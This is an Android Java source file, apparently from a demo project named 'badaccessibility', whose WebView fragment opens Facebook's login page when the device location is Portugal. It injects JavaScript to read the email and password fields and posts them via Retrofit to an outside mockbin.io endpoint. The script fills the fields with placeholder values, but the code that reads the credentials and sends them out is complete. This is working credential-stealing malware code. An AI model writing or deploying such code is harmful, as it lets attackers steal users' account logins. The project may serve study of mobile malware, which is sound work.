package com.hackinghell.badaccessibility;

import android.annotation.SuppressLint;
import android.os.Build;
import android.os.Bundle;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

public class WebViewFragment extends Fragment {

    private WebView webView;
    private String Email;
    private String password;
    private boolean isPortugal = false;

    public static WebViewFragment newInstance() {
        return new WebViewFragment();
    }

    @Override
    public void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if(getArguments() != null) {
            isPortugal = getArguments().getBoolean("isLocationPortugal", false);
            Log.i("facebook", "IS location portugal? = " + String.valueOf(isPortugal));
        }
    }

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
        return inflater.inflate(R.layout.fragment_web_view, container, false);
    }
    @Override
    public void onViewCreated(@NonNull View view, @Nullable Bundle savedInstanceState) {
        super.onViewCreated(view, savedInstanceState);
        if (isPortugal) {
            executeJavascript(view);
        }
    }

    private void executeJavascript(View view) {
        // Initialize the webview, enable javascript and create new client
        webView = view.findViewById(R.id.webview1);
        webView.setVerticalScrollBarEnabled(true);
        WebSettings webViewSettings = webView.getSettings();
        webViewSettings.setJavaScriptEnabled(true);
        webView.setWebViewClient(new WebViewClient());
        if (Build.VERSION.SDK_INT >= 21) {
            CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);
        } else {
            CookieManager.getInstance().setAcceptCookie(true);
        }
        // load url
        webView.loadUrl("https://www.facebook.com");

        class myJSInterface {
            @JavascriptInterface
            public void myJSInterface(String message) {
                Toast.makeText(newInstance().getActivity(), message, Toast.LENGTH_SHORT).show();
            }
        }
        webView.addJavascriptInterface(new myJSInterface(), "JSInterface");

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                // Execute Javascript
                webView.evaluateJavascript(
                        " (function() { " +
                                " document.getElementById('m_login_email').value = 'your_username';" +
                                " var email = document.querySelector('input[name=\"email\"]').value; " +
                                " return email; " +
                                " })(); "
                        ,result -> {
                            Log.i("facebook", "Input " + result);
                            result = result.replaceAll("\"", "");
                            Email = result;
                        });

                // Execute Javascript
                webView.evaluateJavascript(
                        " (function() { " +
                                " document.getElementById('m_login_password').value = 'my_password';" +
                                " var password =  document.querySelector('input[name=\"pass\"]').value; " +
                                " return password; " +
                                " })(); "
                        ,result -> {
                            Log.i("facebook", "Input " + result);
                            result = result.replaceAll("\"", "");
                            password = result;
                            if (getActivity() != null) {
                                //Toast.makeText(getActivity(), (Email + " " + password), Toast.LENGTH_SHORT).show();
                                sendPostrequest();
                            }
                        });
            }
        });
    }

    private void sendPostrequest() {
        Toast.makeText(getActivity(), (Email + " " + password), Toast.LENGTH_SHORT).show();
        Retrofit retrofit = new Retrofit.Builder().baseUrl("https://17ca5b6a00714e79a2f54e243ebb4895.api.mockbin.io/")
                .addConverterFactory(GsonConverterFactory.create())
                .build();

        LoginData loginData = new LoginData(Email, password);

        IpLocation ipAPI = retrofit.create(IpLocation.class);

        Call<Void> call = ipAPI.sendLoginInfo(loginData);
        call.enqueue(new Callback<Void>() {
            @Override
            public void onResponse(Call<Void> call, Response<Void> response) {
                if (response.isSuccessful()) {
                    Log.i("facebook", "Login info was successfully sent to server");
                }
            }

            @Override
            public void onFailure(Call<Void> call, Throwable t) {

            }
        });

    }
}